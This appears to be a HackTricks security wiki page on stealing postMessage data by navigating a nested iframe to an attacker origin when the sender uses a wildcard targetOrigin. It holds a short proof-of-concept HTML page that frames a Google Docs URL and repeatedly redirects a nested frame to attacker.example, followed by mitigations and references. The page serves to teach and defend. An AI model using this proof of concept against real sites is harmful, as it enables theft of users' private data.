# Stealing `postMessage` Data by Navigating an Iframe

{{#include ../../banners/hacktricks-training.md}}

## Navigating Child Frames

Suppose an attacker can frame a page that is not protected by `X-Frame-Options` or CSP `frame-ancestors`, and that page contains a nested iframe. Cross-origin scripts cannot read the nested document, but browser cross-origin interfaces expose limited `Window` and `Location` access: `window.frames` can be read and a referenced window's location can be written.<sup>[[1]](#references)</sup>

This behavior can become a data-exposure primitive when the nested document receives sensitive data through `postMessage(..., "*")`. If the attacker navigates the intended receiving frame to an attacker-controlled origin before the message is sent, the wildcard `targetOrigin` allows the replacement document to receive the message. Both MDN and OWASP recommend specifying the exact expected origin rather than `*` whenever possible.<sup>[[2]](#references)[[3]](#references)</sup>

The same underlying race can involve a child, parent, or opener window when the attacker retains a window reference and the browser permits that particular cross-origin navigation. The critical conditions are control of the navigation timing and a sender that uses a wildcard or otherwise incorrect `targetOrigin`.<sup>[[1]](#references)[[2]](#references)</sup>

The following proof-of-concept structure is adapted from a Google VRP write-up. Frame indexes and navigation permissions vary with the document tree and browser behavior, so inspect the actual hierarchy rather than copying the indexes blindly.<sup>[[4]](#references)</sup>

```html
<!doctype html>
<html lang="en">
  <body>
    <iframe src="https://docs.google.com/document/ID"></iframe>
    <script>
      setTimeout(() => {
        // Retry because the nested frame may be created asynchronously.
        setInterval(() => {
          window.frames[0].frames[0].frames[2].location =
            "https://attacker.example/exploit.html"
        }, 100)
      }, 6000)
    </script>
  </body>
</html>
```

## Mitigation

- Send sensitive messages only with an exact `targetOrigin`.
- On receipt, validate both `event.origin` and, where appropriate, `event.source`.
- Prevent unauthorized framing with CSP `frame-ancestors` (and `X-Frame-Options` for legacy compatibility).

## References

- [1] [MDN - Same-origin policy: cross-origin script API access](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_script_api_access)
- [2] [MDN - `Window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [3] [OWASP HTML5 Security Cheat Sheet - Web Messaging](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging)
- [4] [GeekyCat - Google VRP: Hijacking Google Docs Screenshots](https://blog.geekycat.in/posts/hijacking-google-docs-screenshots/)

{{#include ../../banners/hacktricks-training.md}}
